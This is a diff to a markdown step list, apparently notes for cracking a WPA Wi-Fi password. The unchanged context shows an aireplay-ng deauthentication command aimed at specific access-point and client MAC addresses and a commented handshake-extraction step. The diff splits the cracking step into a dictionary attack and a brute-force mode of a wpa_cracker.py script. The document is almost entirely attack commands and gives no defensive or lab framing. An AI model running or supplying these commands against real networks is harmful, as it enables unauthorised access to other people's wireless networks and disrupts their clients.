@@ -17,6 +17,10 @@ sudo aireplay-ng --deauth 10 -a e8:48:b8:f0:0f:9c -c 52:62:E7:6C:26:C2 wlp1s0mon
 ## 6. Extract values (ANonce, SNonce, MICs)
 <!-- python3 extract-handshake.py do-deauth-05.cap --ssid "4010" --ap e8:48:b8:f0:0f:9c --client 52:62:E7:6C:26:C2 --out handshake.json -->
 
-## 7. Brute-force password and match
-python3 wpa_cracker.py do-deauth-02.cap passlist.txt
+## 7.1 Dictionary attack using bruteforce
+python3 wpa_cracker.py do-deauth-02.cap --wordlist passlist.txt 
+
+## 7.2 Bruteforce
+python3 wpa_cracker.py do-deauth-02.cap --bruteforce
++ optionally specify minimum length and maximum length of bruteforced password
 
